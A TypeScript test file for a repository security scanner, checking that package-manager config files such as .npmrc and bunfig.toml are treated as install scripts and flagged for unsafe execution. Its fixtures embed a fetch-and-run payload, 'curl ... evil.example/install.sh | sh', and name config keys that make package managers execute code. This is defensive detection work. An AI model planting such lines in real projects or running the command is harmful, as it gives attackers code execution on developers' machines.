import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

/**
 * Package managers read these files on every install or run, and each can
 * make them execute code: `node-options` and `script-shell` in `.npmrc`,
 * `yarn-path` in `.yarnrc`, `yarnPath` in `.yarnrc.yml`, the pnpm install
 * hooks in `.pnpmfile.cjs` and `preload` in `bunfig.toml`.
 */
const CONFIGS: [string, string][] = [
  [".npmrc", `node-options=--require ./x.js\nscript-shell=${PAYLOAD}\n`],
  [".yarnrc", `yarn-path "./x.js"\n# ${PAYLOAD}\n`],
  [".yarnrc.yml", `yarnPath: ./x.cjs\n# ${PAYLOAD}\n`],
  [".pnpmfile.cjs", `// ${PAYLOAD}\nmodule.exports = { hooks: {} };\n`],
  ["bunfig.toml", `preload = ["./x.ts"]\n# ${PAYLOAD}\n`],
];

test("package-manager configuration is scanned as an install script", () => {
  for (const [file, text] of CONFIGS)
    for (const path of [file, `packages/web/${file}`, file.toUpperCase()]) {
      expect({ path, surfaces: surfacesOf(path) }).toEqual({
        path,
        surfaces: ["installScripts", "source"],
      });
      const inspection = inspected(path, text);
      expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
        path,
        coverage: { state: "complete", items: 1 },
      });
      expect({
        path,
        findings: inspection.findings.map(
          (finding) =>
            `${finding.path}:${finding.category}:${finding.severity}`,
        ),
      }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    }
});

test("similar names that package managers do not read keep their surfaces", () => {
  expect(surfacesOf("docs/npmrc.md")).toEqual([]);
  expect(surfacesOf("example.npmrc")).toEqual([]);
  expect(surfacesOf("config/bunfig.example.toml")).toEqual(["source"]);
});
